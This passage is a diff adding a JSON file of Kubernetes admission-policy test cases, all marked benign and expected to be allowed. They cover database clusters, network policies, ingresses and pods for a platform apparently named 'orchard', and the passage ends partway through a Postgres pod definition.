@@ -1,0 +1,3900 @@
+[
+ {
+  "expect": "allow",
+  "name": "benign/cnpg-cluster-recovery",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard"
+    },
+    "name": "db-restore",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "bootstrap": {
+     "recovery": {
+      "source": "origin"
+     }
+    },
+    "enablePDB": false,
+    "enableSuperuserAccess": false,
+    "externalClusters": [
+     {
+      "name": "origin"
+     }
+    ],
+    "imageName": "ghcr.io/cloudnative-pg/postgresql:17.5",
+    "instances": 1,
+    "postgresql": {
+     "parameters": {
+      "shared_buffers": "64MB"
+     }
+    },
+    "primaryUpdateStrategy": "unsupervised",
+    "storage": {
+     "size": "10Gi"
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/cnpg-cluster",
+  "object": {
+   "apiVersion": "postgresql.cnpg.io/v1",
+   "kind": "Cluster",
+   "metadata": {
+    "annotations": {
+     "orchard.my/applied-shared-buffers": "64MB"
+    },
+    "labels": {
+     "app.kubernetes.io/component": "postgres",
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "db"
+    },
+    "name": "db",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "bootstrap": {
+     "initdb": {
+      "database": "app",
+      "import": {
+       "databases": [
+        "x"
+       ],
+       "postImportApplicationSQL": [
+        "ANALYZE"
+       ],
+       "source": {
+        "externalCluster": "import-source"
+       },
+       "type": "microservice"
+      },
+      "owner": "u_app",
+      "secret": {
+       "name": "db-app"
+      }
+     }
+    },
+    "enablePDB": false,
+    "enableSuperuserAccess": false,
+    "externalClusters": [
+     {
+      "connectionParameters": {
+       "dbname": "x",
+       "host": "src.example.com",
+       "port": "5432",
+       "sslmode": "require",
+       "user": "u"
+      },
+      "name": "import-source",
+      "password": {
+       "key": "password",
+       "name": "db-import-source"
+      }
+     }
+    ],
+    "imageName": "ghcr.io/cloudnative-pg/postgresql:17.5",
+    "instances": 1,
+    "postgresql": {
+     "parameters": {
+      "max_connections": "200",
+      "max_slot_wal_keep_size": "2GB",
+      "shared_buffers": "64MB",
+      "work_mem": "8MB"
+     },
+     "shared_preload_libraries": [
+      "pg_stat_statements"
+     ]
+    },
+    "primaryUpdateStrategy": "unsupervised",
+    "storage": {
+     "size": "10Gi"
+    }
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/endpointslice-controller",
+  "object": {
+   "addressType": "IPv4",
+   "apiVersion": "discovery.k8s.io/v1",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.42.0.5"
+     ]
+    }
+   ],
+   "kind": "EndpointSlice",
+   "metadata": {
+    "labels": {
+     "kubernetes.io/service-name": "app"
+    },
+    "name": "app-abcde",
+    "namespace": "orchard-policy-test"
+   },
+   "ports": [
+    {
+     "port": 8080,
+     "protocol": "TCP"
+    }
+   ]
+  },
+  "user": "system:serviceaccount:kube-system:endpointslice-controller"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/endpointslice-protection-proxy",
+  "object": {
+   "addressType": "IPv4",
+   "apiVersion": "discovery.k8s.io/v1",
+   "endpoints": [
+    {
+     "addresses": [
+      "10.43.1.2"
+     ],
+     "conditions": {
+      "ready": true,
+      "serving": true
+     }
+    }
+   ],
+   "kind": "EndpointSlice",
+   "metadata": {
+    "labels": {
+     "kubernetes.io/service-name": "orchard-protection-proxy",
+     "orchard.my/managed": "true"
+    },
+    "name": "orchard-protection-proxy-1",
+    "namespace": "orchard-policy-test"
+   },
+   "ports": [
+    {
+     "port": 3001,
+     "protocol": "TCP"
+    }
+   ]
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/ingress-acme-solver",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "kubernetes.io/ingress.class": "haproxy",
+     "nginx.ingress.kubernetes.io/whitelist-source-range": "0.0.0.0/0,::/0"
+    },
+    "labels": {
+     "acme.cert-manager.io/http01-solver": "true"
+    },
+    "name": "cm-acme-http-solver-abcde",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "app.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "cm-acme-http-solver-abcde",
+           "port": {
+            "number": 8089
+           }
+          }
+         },
+         "path": "/.well-known/acme-challenge/tok",
+         "pathType": "ImplementationSpecific"
+        }
+       ]
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:cert-manager:cert-manager"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/ingress-custom-domain",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "acme.cert-manager.io/http01-edit-in-place": "true",
+     "cert-manager.io/cluster-issuer": "letsencrypt-prod"
+    },
+    "labels": {
+     "leaf.dev/managed": "true"
+    },
+    "name": "app-ing",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "app.apps.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "app",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ],
+    "tls": [
+     {
+      "hosts": [
+       "app.apps.example.com"
+      ],
+      "secretName": "leaf-cert-1234"
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/ingress-wildcard-host",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "Ingress",
+   "metadata": {
+    "annotations": {
+     "acme.cert-manager.io/http01-edit-in-place": "true"
+    },
+    "labels": {
+     "leaf.dev/managed": "true"
+    },
+    "name": "app-wild",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingressClassName": "haproxy",
+    "rules": [
+     {
+      "host": "app.apps.example.com",
+      "http": {
+       "paths": [
+        {
+         "backend": {
+          "service": {
+           "name": "app",
+           "port": {
+            "number": 80
+           }
+          }
+         },
+         "path": "/",
+         "pathType": "Prefix"
+        }
+       ]
+      }
+     }
+    ],
+    "tls": [
+     {
+      "hosts": [
+       "app.apps.example.com"
+      ],
+      "secretName": "wildcard-apps-example-com-tls"
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/namespace-update-labels",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "name": "x",
+     "orchard.my/current-org": "org-1",
+     "orchard.my/managed": "true",
+     "pod-security.kubernetes.io/audit": "restricted",
+     "pod-security.kubernetes.io/enforce": "baseline",
+     "pod-security.kubernetes.io/warn": "restricted"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "oldObject": {
+   "apiVersion": "v1",
+   "kind": "Namespace",
+   "metadata": {
+    "labels": {
+     "name": "x",
+     "orchard.my/managed": "true",
+     "pod-security.kubernetes.io/audit": "restricted",
+     "pod-security.kubernetes.io/enforce": "baseline",
+     "pod-security.kubernetes.io/warn": "restricted"
+    },
+    "name": "orchard-policy-test"
+   }
+  },
+  "operation": "UPDATE",
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-database-platform",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "orchard.my/managed": "true"
+    },
+    "name": "allow-database-platform",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "ports": [
+       {
+        "port": 9000,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard"
+         }
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 6443,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "10.0.0.1/32"
+        }
+       }
+      ]
+     }
+    ],
+    "ingress": [
+     {
+      "from": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "monitoring"
+         }
+        }
+       }
+      ],
+      "ports": [
+       {
+        "port": 9187,
+        "protocol": "TCP"
+       }
+      ]
+     },
+     {
+      "from": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "postgresql"
+         }
+        },
+        "podSelector": {
+         "matchLabels": {
+          "app.kubernetes.io/name": "cloudnative-pg"
+         }
+        }
+       }
+      ],
+      "ports": [
+       {
+        "port": 8000,
+        "protocol": "TCP"
+       }
+      ]
+     }
+    ],
+    "podSelector": {
+     "matchExpressions": [
+      {
+       "key": "cnpg.io/cluster",
+       "operator": "Exists"
+      }
+     ]
+    },
+    "policyTypes": [
+     "Ingress",
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-default-deny-protection",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "orchard.my/managed": "true"
+    },
+    "name": "default-deny-all",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-policy-test"
+         }
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "network"
+         }
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 53,
+        "protocol": "UDP"
+       },
+       {
+        "port": 53,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "kube-system"
+         }
+        },
+        "podSelector": {
+         "matchLabels": {
+          "k8s-app": "kube-dns"
+         }
+        }
+       }
+      ]
+     },
+     {
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0",
+         "except": [
+          "10.0.0.0/8",
+          "172.16.0.0/12",
+          "192.168.0.0/16",
+          "169.254.0.0/16",
+          "100.64.0.0/10"
+         ]
+        }
+       }
+      ]
+     },
+     {
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchExpressions": [
+          {
+           "key": "orchard.my/managed",
+           "operator": "Exists"
+          }
+         ]
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchExpressions": [
+          {
+           "key": "orchard.dev/managed",
+           "operator": "Exists"
+          }
+         ]
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 9000,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-r2-proxy"
+         }
+        }
+       }
+      ]
+     }
+    ],
+    "ingress": [
+     {
+      "from": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-policy-test"
+         }
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "network"
+         }
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard"
+         }
+        }
+       }
+      ]
+     }
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Ingress",
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-default-deny",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "orchard.my/managed": "true"
+    },
+    "name": "default-deny-all",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-policy-test"
+         }
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "network"
+         }
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 53,
+        "protocol": "UDP"
+       },
+       {
+        "port": 53,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "kube-system"
+         }
+        },
+        "podSelector": {
+         "matchLabels": {
+          "k8s-app": "kube-dns"
+         }
+        }
+       }
+      ]
+     },
+     {
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0",
+         "except": [
+          "10.0.0.0/8",
+          "172.16.0.0/12",
+          "192.168.0.0/16",
+          "169.254.0.0/16",
+          "100.64.0.0/10"
+         ]
+        }
+       }
+      ]
+     },
+     {
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchExpressions": [
+          {
+           "key": "orchard.my/managed",
+           "operator": "Exists"
+          }
+         ]
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchExpressions": [
+          {
+           "key": "orchard.dev/managed",
+           "operator": "Exists"
+          }
+         ]
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 9000,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-r2-proxy"
+         }
+        }
+       }
+      ]
+     }
+    ],
+    "ingress": [
+     {
+      "from": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-policy-test"
+         }
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "network"
+         }
+        }
+       },
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard"
+         }
+        }
+       }
+      ]
+     }
+    ],
+    "podSelector": {},
+    "policyTypes": [
+     "Ingress",
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-project-databases",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "orchard.my/managed": "true"
+    },
+    "name": "allow-project-databases",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingress": [
+     {
+      "from": [
+       {
+        "namespaceSelector": {
+         "matchLabels": {
+          "kubernetes.io/metadata.name": "orchard-policy-test"
+         }
+        }
+       }
+      ],
+      "ports": [
+       {
+        "port": 5432,
+        "protocol": "TCP"
+       }
+      ]
+     }
+    ],
+    "podSelector": {
+     "matchExpressions": [
+      {
+       "key": "cnpg.io/cluster",
+       "operator": "Exists"
+      }
+     ]
+    },
+    "policyTypes": [
+     "Ingress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-public-database",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "cnpg.io/cluster": "db"
+    },
+    "name": "db-allow-public",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingress": [
+     {
+      "from": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0"
+        }
+       },
+       {
+        "namespaceSelector": {}
+       }
+      ],
+      "ports": [
+       {
+        "port": 5432,
+        "protocol": "TCP"
+       }
+      ]
+     }
+    ],
+    "podSelector": {
+     "matchLabels": {
+      "cnpg.io/cluster": "db"
+     }
+    },
+    "policyTypes": [
+     "Ingress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-public-deployment",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "app"
+    },
+    "name": "app-allow-public",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "ingress": [
+     {
+      "from": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0"
+        }
+       },
+       {
+        "namespaceSelector": {}
+       }
+      ],
+      "ports": [
+       {
+        "port": 8080,
+        "protocol": "TCP"
+       }
+      ]
+     }
+    ],
+    "podSelector": {
+     "matchLabels": {
+      "app.kubernetes.io/name": "app"
+     }
+    },
+    "policyTypes": [
+     "Ingress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/networkpolicy-tailscale",
+  "object": {
+   "apiVersion": "networking.k8s.io/v1",
+   "kind": "NetworkPolicy",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "orchard.my/tailscale": "true",
+     "orchard.my/target-deployment": "app"
+    },
+    "name": "ts--isolate--app",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "egress": [
+     {
+      "ports": [
+       {
+        "port": 8080,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "podSelector": {
+         "matchExpressions": [
+          {
+           "key": "orchard.my/tailscale",
+           "operator": "DoesNotExist"
+          }
+         ],
+         "matchLabels": {
+          "app.kubernetes.io/managed-by": "orchard",
+          "app.kubernetes.io/name": "app"
+         }
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 53,
+        "protocol": "UDP"
+       },
+       {
+        "port": 53,
+        "protocol": "TCP"
+       }
+      ],
+      "to": []
+     },
+     {
+      "ports": [
+       {
+        "port": 443,
+        "protocol": "TCP"
+       },
+       {
+        "port": 3478,
+        "protocol": "UDP"
+       },
+       {
+        "port": 41641,
+        "protocol": "UDP"
+       }
+      ],
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "0.0.0.0/0",
+         "except": [
+          "10.0.0.0/8",
+          "172.16.0.0/12",
+          "192.168.0.0/16",
+          "169.254.0.0/16",
+          "100.64.0.0/10"
+         ]
+        }
+       }
+      ]
+     },
+     {
+      "ports": [
+       {
+        "port": 6443,
+        "protocol": "TCP"
+       }
+      ],
+      "to": [
+       {
+        "ipBlock": {
+         "cidr": "10.0.0.1/32"
+        }
+       }
+      ]
+     }
+    ],
+    "ingress": [],
+    "podSelector": {
+     "matchLabels": {
+      "app.kubernetes.io/name": "ts--proxy--app",
+      "orchard.my/tailscale": "true"
+     }
+    },
+    "policyTypes": [
+     "Ingress",
+     "Egress"
+    ]
+   }
+  },
+  "user": "system:serviceaccount:orchard:orchard-server"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pod-acme-solver",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "acme.cert-manager.io/http01-solver": "true"
+    },
+    "name": "cm-acme-http-solver-abcde",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "quay.io/jetstack/cert-manager-acmesolver:v1.17.0",
+      "name": "acmesolver",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       },
+       "readOnlyRootFilesystem": true,
+       "runAsNonRoot": true,
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:cert-manager:cert-manager"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pod-app-clusterip",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "app-clusterip",
+     "pod-template-hash": "7d9f8c5b6"
+    },
+    "name": "app-clusterip-7d9f8c5b6-x2k4p",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "automountServiceAccountToken": false,
+    "containers": [
+     {
+      "env": [
+       {
+        "name": "A",
+        "value": "b"
+       },
+       {
+        "name": "HOST",
+        "value": "0.0.0.0"
+       },
+       {
+        "name": "FORCE_COLOR",
+        "value": "1"
+       }
+      ],
+      "image": "registry.example.com/org/app:1",
+      "imagePullPolicy": "IfNotPresent",
+      "name": "app-clusterip",
+      "ports": [
+       {
+        "containerPort": 8080,
+        "name": "http",
+        "protocol": "TCP"
+       }
+      ],
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "add": [
+         "SETUID",
+         "SETGID",
+         "CHOWN",
+         "FOWNER",
+         "DAC_OVERRIDE",
+         "SYS_CHROOT"
+        ],
+        "drop": [
+         "ALL"
+        ]
+       },
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "volumeMounts": [
+       {
+        "mountPath": "/data",
+        "name": "data",
+        "readOnly": false
+       },
+       {
+        "mountPath": "/tmp",
+        "name": "scratch",
+        "readOnly": false
+       }
+      ]
+     }
+    ],
+    "runtimeClassName": "gvisor",
+    "volumes": [
+     {
+      "name": "data",
+      "persistentVolumeClaim": {
+       "claimName": "app-clusterip-data"
+      }
+     },
+     {
+      "emptyDir": {},
+      "name": "scratch"
+     }
+    ]
+   }
+  }
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pod-app-nodeport",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "app-nodeport",
+     "pod-template-hash": "7d9f8c5b6"
+    },
+    "name": "app-nodeport-7d9f8c5b6-x2k4p",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "automountServiceAccountToken": false,
+    "containers": [
+     {
+      "env": [
+       {
+        "name": "A",
+        "value": "b"
+       },
+       {
+        "name": "HOST",
+        "value": "0.0.0.0"
+       },
+       {
+        "name": "FORCE_COLOR",
+        "value": "1"
+       }
+      ],
+      "image": "registry.example.com/org/app:1",
+      "imagePullPolicy": "IfNotPresent",
+      "name": "app-nodeport",
+      "ports": [
+       {
+        "containerPort": 8080,
+        "name": "http",
+        "protocol": "TCP"
+       }
+      ],
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "add": [
+         "SETUID",
+         "SETGID",
+         "CHOWN",
+         "FOWNER",
+         "DAC_OVERRIDE",
+         "SYS_CHROOT"
+        ],
+        "drop": [
+         "ALL"
+        ]
+       },
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      },
+      "volumeMounts": [
+       {
+        "mountPath": "/data",
+        "name": "data",
+        "readOnly": false
+       },
+       {
+        "mountPath": "/tmp",
+        "name": "scratch",
+        "readOnly": false
+       }
+      ]
+     }
+    ],
+    "runtimeClassName": "gvisor",
+    "volumes": [
+     {
+      "name": "data",
+      "persistentVolumeClaim": {
+       "claimName": "app-nodeport-data"
+      }
+     },
+     {
+      "emptyDir": {},
+      "name": "scratch"
+     }
+    ]
+   }
+  }
+ },
+ {
+  "expect": "allow",
+  "groups": "system:serviceaccounts,system:serviceaccounts:postgresql,system:authenticated",
+  "name": "benign/pod-cnpg-instance",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard",
+     "cnpg.io/cluster": "db",
+     "cnpg.io/instanceRole": "primary",
+     "cnpg.io/podRole": "instance"
+    },
+    "name": "db-1",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "image": "ghcr.io/cloudnative-pg/postgresql:17.5",
+      "name": "postgres",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "readOnlyRootFilesystem": true,
+       "runAsNonRoot": true
+      }
+     }
+    ],
+    "initContainers": [
+     {
+      "image": "ghcr.io/cloudnative-pg/cloudnative-pg:1.26",
+      "name": "bootstrap-controller",
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "drop": [
+         "ALL"
+        ]
+       }
+      }
+     }
+    ],
+    "volumes": [
+     {
+      "name": "pgdata",
+      "persistentVolumeClaim": {
+       "claimName": "db-1"
+      }
+     },
+     {
+      "emptyDir": {},
+      "name": "scratch-data"
+     },
+     {
+      "emptyDir": {
+       "medium": "Memory"
+      },
+      "name": "shm"
+     },
+     {
+      "name": "projected",
+      "projected": {
+       "sources": []
+      }
+     }
+    ]
+   }
+  },
+  "user": "system:serviceaccount:postgresql:cloudnative-pg"
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pod-job-step",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/managed-by": "orchard-job",
+     "orchard/job-id": "11111111-1111-1111-1111-111111111111",
+     "orchard/project-id": "22222222-2222-2222-2222-222222222222",
+     "orchard/step-order": "1"
+    },
+    "name": "job-1-abcde",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "automountServiceAccountToken": false,
+    "containers": [
+     {
+      "command": [
+       "/bin/sh",
+       "-c",
+       "echo hi"
+      ],
+      "env": [
+       {
+        "name": "ORCHARD_JOB_ID",
+        "value": "11111111-1111-1111-1111-111111111111"
+       },
+       {
+        "name": "ORCHARD_STEP_ORDER",
+        "value": "1"
+       },
+       {
+        "name": "A",
+        "value": "b"
+       }
+      ],
+      "image": "registry.example.com/org/app:1",
+      "imagePullPolicy": "IfNotPresent",
+      "name": "step",
+      "resources": {
+       "limits": {
+        "cpu": "100m",
+        "memory": "128Mi"
+       },
+       "requests": {
+        "cpu": "50m",
+        "memory": "128Mi"
+       }
+      },
+      "securityContext": {
+       "allowPrivilegeEscalation": false,
+       "capabilities": {
+        "add": [
+         "SETUID",
+         "SETGID",
+         "CHOWN",
+         "FOWNER",
+         "DAC_OVERRIDE",
+         "SYS_CHROOT"
+        ],
+        "drop": [
+         "ALL"
+        ]
+       },
+       "seccompProfile": {
+        "type": "RuntimeDefault"
+       }
+      }
+     }
+    ],
+    "restartPolicy": "Never",
+    "runtimeClassName": "gvisor"
+   }
+  }
+ },
+ {
+  "expect": "allow",
+  "name": "benign/pod-legacy-postgres",
+  "object": {
+   "apiVersion": "v1",
+   "kind": "Pod",
+   "metadata": {
+    "labels": {
+     "app.kubernetes.io/component": "postgres",
+     "app.kubernetes.io/managed-by": "orchard",
+     "app.kubernetes.io/name": "legacy-pg",
+     "pod-template-hash": "7d9f8c5b6"
+    },
+    "name": "legacy-pg-7d9f8c5b6-x2k4p",
+    "namespace": "orchard-policy-test"
+   },
+   "spec": {
+    "containers": [
+     {
+      "args": [
+       "postgres",
+       "-c",
+       "archive_mode=on",
+       "-c",
+       "archive_command=/opt/pgbackrest/pgbackrest --stanza=app --config=/etc/pgbackrest/pgbackrest.conf archive-push %p",
+       "-c",
+       "archive_timeout=60",
+       "-c",
+       "max_wal_senders=3",
+       "-c",
+       "wal_level=replica"
+      ],
+      "env": [
+       {
+        "name": "POSTGRES_DB",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "POSTGRES_DB",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "POSTGRES_USER",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "POSTGRES_USER",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "POSTGRES_PASSWORD",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "POSTGRES_PASSWORD",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "PGDATA",
+        "value": "/var/lib/postgresql/data/pgdata"
+       },
+       {
+        "name": "PGBACKREST_REPO1_S3_KEY",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "R2_ACCESS_KEY",
+          "name": "legacy-pg-pg"
+         }
+        }
+       },
+       {
+        "name": "PGBACKREST_REPO1_S3_KEY_SECRET",
+        "valueFrom": {
+         "secretKeyRef": {
+          "key": "R2_SECRET_KEY",
+          "name": "legacy-pg-pg"
+         }
+        }
+       }
+      ],
+      "image": "postgres:17",
+      "imagePullPolicy": "IfNotPresent",
+      "livenessProbe": {
+       "exec": {
+        "command": [
+         "pg_isready",
+         "-U",
+         "u",
+         "-d",
+         "app"
+        ]
+       },
+       "failureThreshold": 6,
+       "periodSeconds": 30,
+       "timeoutSeconds": 5
+      },
+      "name": "postgres",
+      "ports": [
+       {
+        "containerPort": 5432,
+        "name": "postgres",
+        "protocol": "TCP"
+       }
+      ],
+      "readinessProbe": {
+       "exec": {
+        "command": [
+         "pg_isready",
+         "-U",
+         "u",
+         "-d",
+         "app"
+        ]
+       },
+       "failureThreshold": 6,
+       "periodSeconds": 10,
+       "timeoutSeconds": 5
+      },
+      "volumeMounts": [
+       {
+        "mountPath": "/var/lib/postgresql/data",
+        "name": "data"
+       },
+       {
+        "mountPath": "/etc/pgbackrest-config",
+        "name": "pgbackrest-config"
+       },
+       {
+        "mountPath": "/etc/pgbackrest",
+        "name": "pgbackrest-conf"
+       },
+       {
